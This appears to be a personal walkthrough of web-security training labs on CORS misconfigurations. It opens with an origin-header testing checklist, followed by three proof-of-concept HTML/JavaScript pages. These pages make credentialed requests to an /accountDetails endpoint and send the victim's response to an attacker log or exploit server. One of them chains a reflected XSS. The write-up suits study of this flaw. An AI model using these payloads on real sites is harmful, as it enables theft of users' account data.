Overall below are the test cases you need to apply when it comes to CORS vulnerability.
1. Change Origin header value to any arbitrary value
2. Change Origin header value null
3. Change Origin header value  to one that begins with the origin of the site
4. Change Origin header value to one that ends with the origin of the site (Subdomain of the site should have XSS vulnerability)

### CORS vulnerability with basic origin reflection
/accountDetails API in response giving the below header.
```
Access-Control-Allow-Credentials: true
```
Add Origin: evil.com in request and notice the below headers get populated in response headers along with the account details of current user.
```
Access-Control-Allow-Origin: evil.com
Access-Control-Allow-Credentials: true
```
It is confirmed that it is vulnerable to CORS, lets craft out PoC.
cors.html
```html
<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://{HOSTNAME}/{ENDPOINT}',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        location='/log?key='+this.responseText;
    };
</script>
```
Above PoC you need to deliver to victim, once victim clicks on opens the PoC then his account specific details would come in attacker's logs. Dont forget to change HOSTNAME and endpoint value. In our case ENDPOINT should be /accountDetails.
### CORS vulnerability with trusted null origin
* Review the history and observe that your key is retrieved via an AJAX request to /accountDetails, and the response contains the Access-Control-Allow-Credentials header suggesting that it may support CORS.
* Send the request to Burp Repeater, and resubmit it with the added header Origin: null.
* Observe that the "null" origin is reflected in the Access-Control-Allow-Origin header.
HTML poc:
```html
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" srcdoc="<script>
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://{HOSTNAME}/accountDetails',true);
    req.withCredentials = true;
    req.send();
    function reqListener() {
        location='https://{ATTACKER_SERVER}/log?key='+encodeURIComponent(this.responseText);
    };
</script>"></iframe>
```
### CORS vulnerability with trusted insecure protocols
We have tried all the test cases of CORS mentioned at start and found out that this website has an insecure CORS configuration in that it trusts all subdomains regardless of the protocol.
Also have found XSS on one of the subdomains it trusts. With the help of this XSS vulnerability we can exploit CORS vulnerability on the main site. In subdomain a parameter productID was vulnerable to XSS as shown below.
```
https://stock.0a9b00b7031149698075f8e900550078.web-security-academy.net/?productId=1<script>alert(1)</script>&storeId=2
```
The response would look like this.
```json
HTTP/2 400 Bad Request
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Content-Length: 60

<h4>ERROR</h4>Invalid product ID: 1<script>alert(1)</script>
```
Also XSS triggers, that means we can execute JavaScript code in subdomain of the main app. Now we want to extract /accountDetails API response by exploiting CORS on main using XSS on subdomain.
```
<html>
    <body>
        <script>
            document.location="https://stock.0a9b00b7031149698075f8e900550078.web-security-academy.net/?productId=<script>var xhr = new XMLHttpRequest();var url = 'https://0a9b00b7031149698075f8e900550078.web-security-academy.net';xhr.onreadystatechange = function(){if (xhr.readyState == XMLHttpRequest.DONE) {fetch('https://exploit-0a6e0092031c49ca80ecf7a3011a0029.exploit-server.net/log?key=' %2b xhr.responseText)}};xhr.open('GET', url %2b '/accountDetails', true);xhr.withCredentials = true;xhr.send(null);%3c/script>&storeId=1"
        </script>
    </body>
</html>
```
Poc didn't work as of now.
